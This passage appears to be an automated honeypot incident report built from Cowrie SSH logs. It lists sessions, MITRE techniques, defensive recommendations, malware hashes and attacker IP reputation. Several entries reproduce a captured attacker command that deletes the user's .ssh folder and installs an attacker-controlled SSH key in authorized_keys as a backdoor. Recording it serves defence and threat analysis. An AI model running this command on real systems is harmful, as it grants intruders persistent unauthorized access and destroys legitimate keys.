| `2026-05-14 18:55:30` | `cowrie.client.kex` |
| `2026-05-14 18:55:30` | `cowrie.login.success` |
| `2026-05-14 18:55:31` | `cowrie.session.params` |
| `2026-05-14 18:55:31` | `cowrie.command.input` |
| `2026-05-14 18:55:31` | `cowrie.command.failed` |
| `2026-05-14 18:55:31` | `cowrie.log.closed` |
| `2026-05-14 18:55:31` | `cowrie.session.params` |
| `2026-05-14 18:55:31` | `cowrie.command.input` |
| `2026-05-14 18:55:31` | `cowrie.session.file_download` |
| `2026-05-14 18:55:31` | `cowrie.log.closed` |
| `2026-05-14 18:55:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5047e7105016

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:55 |
| **Last Seen** | 2026-05-14 18:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:55:35` | `cowrie.session.connect` |
| `2026-05-14 18:55:35` | `cowrie.client.version` |
| `2026-05-14 18:55:37` | `cowrie.client.kex` |
| `2026-05-14 18:55:38` | `cowrie.login.success` |
| `2026-05-14 18:55:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-454e62dc83f6

| Field | Detail |
|---|---|
| **Source IP** | `36.134.208[.]91` |
| **First Seen** | 2026-05-14 19:29 |
| **Last Seen** | 2026-05-14 19:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 19:29:19` | `cowrie.session.connect` |
| `2026-05-14 19:29:19` | `cowrie.client.version` |
| `2026-05-14 19:29:19` | `cowrie.client.kex` |
| `2026-05-14 19:29:19` | `cowrie.login.success` |
| `2026-05-14 19:29:20` | `cowrie.session.params` |
| `2026-05-14 19:29:20` | `cowrie.command.input` |
| `2026-05-14 19:29:20` | `cowrie.command.failed` |
| `2026-05-14 19:29:20` | `cowrie.log.closed` |
| `2026-05-14 19:29:20` | `cowrie.session.params` |
| `2026-05-14 19:29:20` | `cowrie.command.input` |
| `2026-05-14 19:29:21` | `cowrie.session.file_download` |
| `2026-05-14 19:29:21` | `cowrie.log.closed` |
| `2026-05-14 19:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.134.208[.]91` to AbuseIPDB if not already reported
- [ ] Block `36.134.208[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bd691e65504

| Field | Detail |
|---|---|
| **Source IP** | `36.134.208[.]91` |
| **First Seen** | 2026-05-14 19:29 |
| **Last Seen** | 2026-05-14 19:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 19:29:23` | `cowrie.session.connect` |
| `2026-05-14 19:29:23` | `cowrie.client.version` |
| `2026-05-14 19:29:23` | `cowrie.client.kex` |
| `2026-05-14 19:29:24` | `cowrie.login.success` |
| `2026-05-14 19:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.134.208[.]91` to AbuseIPDB if not already reported
- [ ] Block `36.134.208[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e29295120d0

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]105` |
| **First Seen** | 2026-05-14 19:34 |
| **Last Seen** | 2026-05-14 19:34 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 19:34:20` | `cowrie.session.connect` |
| `2026-05-14 19:34:20` | `cowrie.client.version` |
| `2026-05-14 19:34:20` | `cowrie.client.kex` |
| `2026-05-14 19:34:21` | `cowrie.login.success` |
| `2026-05-14 19:34:32` | `cowrie.session.params` |
| `2026-05-14 19:34:32` | `cowrie.command.input` |
| `2026-05-14 19:34:32` | `cowrie.command.failed` |
| `2026-05-14 19:34:33` | `cowrie.log.closed` |
| `2026-05-14 19:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]105` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-506e30961d88

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]105` |
| **First Seen** | 2026-05-14 19:34 |
| **Last Seen** | 2026-05-14 19:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 19:34:36` | `cowrie.session.connect` |
| `2026-05-14 19:34:37` | `cowrie.client.version` |
| `2026-05-14 19:34:37` | `cowrie.client.kex` |
| `2026-05-14 19:34:37` | `cowrie.login.success` |
| `2026-05-14 19:34:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]105` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c714609feed2

| Field | Detail |
|---|---|
| **Source IP** | `187.94.255[.]130` |
| **First Seen** | 2026-05-14 19:35 |
| **Last Seen** | 2026-05-14 19:36 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 19:35:57` | `cowrie.session.connect` |
| `2026-05-14 19:35:57` | `cowrie.client.version` |
| `2026-05-14 19:35:58` | `cowrie.client.kex` |
| `2026-05-14 19:35:59` | `cowrie.login.success` |
| `2026-05-14 19:36:00` | `cowrie.session.params` |
| `2026-05-14 19:36:00` | `cowrie.command.input` |
| `2026-05-14 19:36:00` | `cowrie.command.failed` |
| `2026-05-14 19:36:01` | `cowrie.log.closed` |
| `2026-05-14 19:36:01` | `cowrie.session.params` |
| `2026-05-14 19:36:01` | `cowrie.command.input` |
| `2026-05-14 19:36:02` | `cowrie.session.file_download` |
| `2026-05-14 19:36:02` | `cowrie.log.closed` |
| `2026-05-14 19:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.94.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `187.94.255[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27c5db4a2298

| Field | Detail |
|---|---|
| **Source IP** | `187.94.255[.]130` |
| **First Seen** | 2026-05-14 19:36 |
| **Last Seen** | 2026-05-14 19:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 19:36:06` | `cowrie.session.connect` |
| `2026-05-14 19:36:06` | `cowrie.client.version` |
| `2026-05-14 19:36:06` | `cowrie.client.kex` |
| `2026-05-14 19:36:08` | `cowrie.login.success` |
| `2026-05-14 19:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.94.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `187.94.255[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fdfffbb5978

| Field | Detail |
|---|---|
| **Source IP** | `187.94.255[.]130` |
| **First Seen** | 2026-05-14 19:37 |
| **Last Seen** | 2026-05-14 19:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 19:37:26` | `cowrie.session.connect` |
| `2026-05-14 19:37:26` | `cowrie.client.version` |
| `2026-05-14 19:37:26` | `cowrie.client.kex` |
| `2026-05-14 19:37:28` | `cowrie.login.success` |
| `2026-05-14 19:37:28` | `cowrie.session.params` |
| `2026-05-14 19:37:28` | `cowrie.command.input` |
| `2026-05-14 19:37:28` | `cowrie.command.failed` |
| `2026-05-14 19:37:29` | `cowrie.log.closed` |
| `2026-05-14 19:37:30` | `cowrie.session.params` |
| `2026-05-14 19:37:30` | `cowrie.command.input` |
| `2026-05-14 19:37:30` | `cowrie.session.file_download` |
| `2026-05-14 19:37:30` | `cowrie.log.closed` |
| `2026-05-14 19:37:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.94.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `187.94.255[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c82db9ee9890

| Field | Detail |
|---|---|
| **Source IP** | `187.94.255[.]130` |
| **First Seen** | 2026-05-14 19:37 |
| **Last Seen** | 2026-05-14 19:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 19:37:34` | `cowrie.session.connect` |
| `2026-05-14 19:37:34` | `cowrie.client.version` |
| `2026-05-14 19:37:34` | `cowrie.client.kex` |
| `2026-05-14 19:37:36` | `cowrie.login.success` |
| `2026-05-14 19:37:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.94.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `187.94.255[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-948687f4c29a

| Field | Detail |
|---|---|
| **Source IP** | `187.94.255[.]130` |
| **First Seen** | 2026-05-14 19:46 |
| **Last Seen** | 2026-05-14 19:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 19:46:25` | `cowrie.session.connect` |
| `2026-05-14 19:46:25` | `cowrie.client.version` |
| `2026-05-14 19:46:25` | `cowrie.client.kex` |
| `2026-05-14 19:46:27` | `cowrie.login.success` |
| `2026-05-14 19:46:28` | `cowrie.session.params` |
| `2026-05-14 19:46:28` | `cowrie.command.input` |
| `2026-05-14 19:46:28` | `cowrie.command.failed` |
| `2026-05-14 19:46:28` | `cowrie.log.closed` |
| `2026-05-14 19:46:29` | `cowrie.session.params` |
| `2026-05-14 19:46:29` | `cowrie.command.input` |
| `2026-05-14 19:46:29` | `cowrie.session.file_download` |
| `2026-05-14 19:46:29` | `cowrie.log.closed` |
| `2026-05-14 19:46:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.94.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `187.94.255[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-894fe94f48a0

| Field | Detail |
|---|---|
| **Source IP** | `187.94.255[.]130` |
| **First Seen** | 2026-05-14 19:46 |
| **Last Seen** | 2026-05-14 19:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 19:46:33` | `cowrie.session.connect` |
| `2026-05-14 19:46:33` | `cowrie.client.version` |
| `2026-05-14 19:46:33` | `cowrie.client.kex` |
| `2026-05-14 19:46:34` | `cowrie.login.success` |
| `2026-05-14 19:46:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.94.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `187.94.255[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fa66e791eb3

| Field | Detail |
|---|---|
| **Source IP** | `187.94.255[.]130` |
| **First Seen** | 2026-05-14 19:52 |
| **Last Seen** | 2026-05-14 19:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 19:52:30` | `cowrie.session.connect` |
| `2026-05-14 19:52:30` | `cowrie.client.version` |
| `2026-05-14 19:52:30` | `cowrie.client.kex` |
| `2026-05-14 19:52:32` | `cowrie.login.success` |
| `2026-05-14 19:52:32` | `cowrie.session.params` |
| `2026-05-14 19:52:32` | `cowrie.command.input` |
| `2026-05-14 19:52:32` | `cowrie.command.failed` |
| `2026-05-14 19:52:33` | `cowrie.log.closed` |
| `2026-05-14 19:52:33` | `cowrie.session.params` |
| `2026-05-14 19:52:33` | `cowrie.command.input` |
| `2026-05-14 19:52:34` | `cowrie.session.file_download` |
| `2026-05-14 19:52:34` | `cowrie.log.closed` |
| `2026-05-14 19:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.94.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `187.94.255[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b0780921bfe

| Field | Detail |
|---|---|
| **Source IP** | `187.94.255[.]130` |
| **First Seen** | 2026-05-14 19:52 |
| **Last Seen** | 2026-05-14 19:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 19:52:38` | `cowrie.session.connect` |
| `2026-05-14 19:52:38` | `cowrie.client.version` |
| `2026-05-14 19:52:38` | `cowrie.client.kex` |
| `2026-05-14 19:52:39` | `cowrie.login.success` |
| `2026-05-14 19:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.94.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `187.94.255[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `159.203.20[.]239` | **31** | 2026-05-14 17:55 | 2026-05-14 19:46 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `101.126.55[.]67` | **29** | 2026-05-14 18:32 | 2026-05-14 18:55 | 34m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `187.94.255[.]130` | **16** | 2026-05-14 19:25 | 2026-05-14 19:54 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.117[.]105` | **4** | 2026-05-14 19:26 | 2026-05-14 19:41 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `157.245.147[.]189` | **2** | 2026-05-14 18:30 | 2026-05-14 18:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.200[.]105` | 1 | 2026-05-14 18:50 | 2026-05-14 18:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.251.244[.]178` | 1 | 2026-05-14 18:34 | 2026-05-14 18:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.91.19[.]185` | 1 | 2026-05-14 17:57 | 2026-05-14 17:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.233[.]159` | 1 | 2026-05-14 18:22 | 2026-05-14 18:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.187.176[.]183` | 1 | 2026-05-14 18:20 | 2026-05-14 18:20 | 4s | 0 | `T1592` | 🟢 LOW |
| `60.178.236[.]152` | 1 | 2026-05-14 18:18 | 2026-05-14 18:18 | 13s | 0 | `T1592` | 🟢 LOW |
| `73.72.45[.]69` | 1 | 2026-05-14 18:29 | 2026-05-14 18:29 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `157.245.147[.]189` | SG | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `101.96.200[.]105` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 13 |
